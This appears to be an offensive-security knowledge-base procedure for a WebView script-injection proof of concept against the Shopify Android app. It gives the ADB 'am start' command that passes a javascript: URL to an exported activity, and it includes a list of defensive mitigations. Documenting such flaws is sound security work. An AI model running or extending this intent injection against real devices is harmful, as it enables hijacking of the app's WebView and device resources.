---
id: proc-uuid-003
tags:
  - adb
  - intent-injection
  - rce
type: procedure
tools:
  - '[[tools/ADB-Android-Debug-Bridge]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/am-start-shopify-navigationactivity-malicious-url]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:24:45.146Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Launch-NavigationActivity-via-ADB-with-Malicious-URL

## Summary

This procedure uses ADB to launch the Shopify app's NavigationActivity with a malicious javascript: URL, resulting in arbitrary JS execution in the WebView and potential access to device resources.

## Description

The exploit sends an intent via ADB to start com.shopify.mobile.navigation.NavigationActivity with extras: notification_type=2, notification_category=1, and url=malicious payload. This loads the JS in SmartWebview, taking over EASDK interfaces. Target: Android device with app and USB debugging. Requires ADB setup. Outcomes: JS alert and confirmed execution; further payloads can access files with user interaction.

## Requirements

1. ADB connected Android device with Shopify app
2. USB debugging enabled
3. Crafted payload from prior procedure
4. Local machine with ADB installed

## Defense

Defensive measures and detection strategies:

- Restrict activity exports or validate callers
- Block ADB in production devices
- Implement WebView client overrides to reject non-http schemes
- Monitor intent logs for suspicious extras

## Objectives

1. Trigger JS execution via intent
2. Verify WebView takeover
3. Demonstrate impact on app interfaces

## Instructions

### Step 1: Prepare Device Connection

**Context**: Ensure ADB recognizes the device.

**Command** ([[commands/adb-devices-check]]):
```bash
adb devices
```

> Lists connected devices. Expected output: Device serial in list.

### Step 2: Execute Intent Launch

**Context**: Start the activity with malicious extras to inject URL.

**Command** ([[commands/am-start-shopify-navigationactivity-malicious-url]]):
```bash
am start -n com.shopify.mobile/com.shopify.mobile.navigation.NavigationActivity --es notification_type 2 --es notification_category 1 --es url 'javascript://shopify.com/admin/articles/%0aalert(1);//'
```

> Launches app and executes JS. Expected output: Success message; in-app alert '1'.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/am-start-shopify-navigationactivity-malicious-url]]

## Tools Used

- [[tools/ADB-Android-Debug-Bridge]]

## Tags

- [[adb]]
- [[intent-injection]]
